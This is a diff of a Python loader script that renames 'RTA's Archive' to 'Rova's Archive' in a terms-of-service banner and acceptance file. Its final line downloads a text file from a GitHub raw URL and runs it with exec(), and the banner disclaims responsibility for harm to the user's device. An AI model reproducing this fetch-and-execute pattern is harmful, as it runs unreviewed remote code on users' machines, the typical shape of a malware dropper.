@@ -22,32 +22,32 @@ except:
 from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
 os.system('cls')
 confirmation = print("\033[1;31m                                Press any key only when you agree and understand the TOS.")
-TOS = print(Box.Lines("RTA's Archive Terms of Service (TOS)"))
+TOS = print(Box.Lines("Rova's Archive Terms of Service (TOS)"))
 banner = f"""
 
 
 
-              The term "We" refers to the entire Developer/Owner of RTA's Archive and RTA's Archive as a whole, 
-                   while "You" refers to you as the user and person using the products of RTA's Archive.
+              The term "We" refers to the entire Developer/Owner of Rova's Archive and Rova's Archive as a whole, 
+                   while "You" refers to you as the user and person using the products of Rova's Archive.
 
-     You need to ensure that you voluntarily download/use RTA Loader without any coercion from anyone/a third party.
+     You need to ensure that you voluntarily download/use Rova Loader without any coercion from anyone/a third party.
   "Someone/a third party" here mainly refers to the cases You are asked by a server/stranger to start this application.
 
-            By pressing continue(enter), you agree that you will not use RTA Loader in particular/RTA's Archive
+            By pressing continue(enter), you agree that you will not use Rova Loader in particular/Rova's Archive
                                 products in general for commercial purposes(eg selling).
 
              You must also accept that you will be solely responsible for all situations/cases that MAY occur
-               to your device during/after the period of using the PRODUCTS IN RTA Loader. (Not the loader.)
+               to your device during/after the period of using the PRODUCTS IN Rova Loader. (Not the loader.)
 
-            At the same time, we will maintain and ensure the safety of all users when using RTA Loader and any 
+            At the same time, we will maintain and ensure the safety of all users when using Rova Loader and any 
  participation/influence on our actions may result in a PERMANENT BAN OF HWID of the person who committed the above act.
 
-            By continuing to use any products maintained by RTA's Archive, you voluntarily agree to be bound 
+            By continuing to use any products maintained by Rova's Archive, you voluntarily agree to be bound 
                                 by the most current version of the Terms of Service.
 """[1:]
 Write.Print((banner), Colors.white_to_green, interval=0.00025)
 msvcrt.getch()
-file = open('TOSVDOIAHWOIHSAKLFHWA.txt', 'a')
-file.write("""The user have accepted RTA's Archive's terms of service.""")
+file = open('RovaLoaderTOS.txt', 'a')
+file.write("""The user have accepted Rova's Archive's terms of service.""")
 file.close()
 exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
